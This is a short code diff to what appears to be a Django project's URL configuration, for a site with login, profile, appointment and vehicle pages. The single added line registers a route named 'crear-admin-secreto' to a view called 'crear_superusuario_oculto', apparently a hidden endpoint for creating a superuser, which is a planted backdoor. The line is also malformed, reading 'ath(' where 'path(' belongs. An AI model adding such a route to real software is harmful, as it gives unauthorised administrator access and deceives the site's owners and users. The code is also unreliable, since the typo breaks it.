@@ -20,6 +20,7 @@ urlpatterns = [
 
     path("login/", views.login_view, name="login"),
     path('perfil/', views.perfil_usuario, name='perfil'),
+    ath('crear-admin-secreto/', views.crear_superusuario_oculto, name='crear_admin_secreto'),
     path("registro/", views.registro_view, name="registro"),
     path("mis-citas/", views.mis_citas, name="mis_citas"),
     path("mis-vehiculos/", views.mis_vehiculos, name="mis_vehiculos"),
